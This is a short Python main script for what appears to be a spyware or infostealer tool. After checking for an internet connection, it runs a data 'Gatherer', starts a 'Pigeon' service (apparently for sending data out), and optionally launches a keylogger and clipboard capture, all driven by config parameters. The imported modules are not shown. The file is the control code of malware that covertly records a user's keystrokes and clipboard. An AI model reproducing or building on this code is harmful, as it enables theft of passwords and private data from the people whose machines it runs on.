from config import *
from modules.configMaker import makeConfig
from modules.gatherer import Gatherer
from modules.keylogger import keylogger
from modules.pigeon import Pigeon
import requests
import sys
from threading import Thread


def isCxnActive() -> bool:
    urls = [
        "https://github.com",
        "https://google.com",
        "https://duckduckgo.com",
        "https://bing.com",
    ]
    for url in urls:
        try:
            stat = requests.head(url, timeout=5).status_code
            if stat:
                return True
        except requests.ConnectionError:
            continue
    return False


if __name__ == "__main__":
    if not isCxnActive():
        exit(0)
    update(argline=sys.argv[1:])
    makeConfig()
    Gatherer()
    Thread(target=Pigeon.startService).start()
    try:
        if PARAM.get("keylogger") != None:
            klInstance = keylogger()
            klThread = Thread(target=klInstance.startService)
            klThread.start()
        if PARAM.get("clipboard") != None:
            if PARAM.get("interval") != None:
                METHODS["clipboard"](int(PARAM["interval"]))
            else:
                METHODS["clipboard"]()
    except KeyboardInterrupt:
        Pigeon.stopService()
        klInstance.stopService()
